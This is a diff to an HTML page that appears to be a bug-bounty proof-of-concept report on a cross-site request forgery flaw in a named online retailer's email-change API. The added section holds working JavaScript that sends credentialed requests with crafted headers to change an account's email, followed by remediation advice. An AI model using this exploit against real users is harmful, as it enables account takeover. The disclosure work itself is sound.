@@ -190,6 +190,56 @@ fetch('https://www.boozt.com/eu/en/api/customer/profile/email/change', {
         </tr>
     </table>
 
+    <h2>Browser-Based CSRF Tests</h2>
+    <p>Test the vulnerability from your browser. Each button sends a request with a different email:</p>
+    <button id="csrf-test1">Test CSRF #1</button>
+    <button id="csrf-test2">Test CSRF #2</button>
+    <button id="csrf-test3">Test CSRF #3</button>
+    <div id="result"></div>
+
+    <script>
+        function testCSRF(testNum) {
+            const resultDiv = document.getElementById('result');
+            const emails = [
+                'absolutexon+csrftest1@wearehackerone.com',
+                'absolutexon+csrftest2@wearehackerone.com',
+                'absolutexon+csrftest3@wearehackerone.com'
+            ];
+
+            const email = emails[testNum - 1];
+            resultDiv.innerHTML = `<p>Testing CSRF with email: <strong>${email}</strong></p>`;
+
+            // Use XMLHttpRequest to send raw body without form serialization
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://www.boozt.com/eu/en/api/customer/profile/email/change', true);
+            xhr.withCredentials = true; // Include cookies
+
+            // Set headers to match Burp working request
+            xhr.setRequestHeader('Content-Type', 'text/plain');
+            xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+            xhr.setRequestHeader('Accept', 'application/json');
+
+            // Send raw JSON body (no form serialization - no trailing =)
+            const body = `{"email":"${email}"}`;
+
+            xhr.onload = function () {
+                resultDiv.innerHTML += `<p><strong>Status:</strong> ${xhr.status}</p>`;
+                resultDiv.innerHTML += `<p><strong>Response:</strong> ${xhr.responseText.substring(0, 200)}</p>`;
+            };
+
+            xhr.onerror = function () {
+                resultDiv.innerHTML += `<p><strong>Error:</strong> Request failed</p>`;
+            };
+
+            xhr.send(body);
+            resultDiv.innerHTML += `<p>Request sent to Boozt...</p>`;
+        }
+
+        document.getElementById('csrf-test1').onclick = () => testCSRF(1);
+        document.getElementById('csrf-test2').onclick = () => testCSRF(2);
+        document.getElementById('csrf-test3').onclick = () => testCSRF(3);
+    </script>
+
     <h2>Remediation</h2>
     <p>Implement proper CSRF protection:</p>
     <pre>1. Validate Origin/Referer headers match expected domain
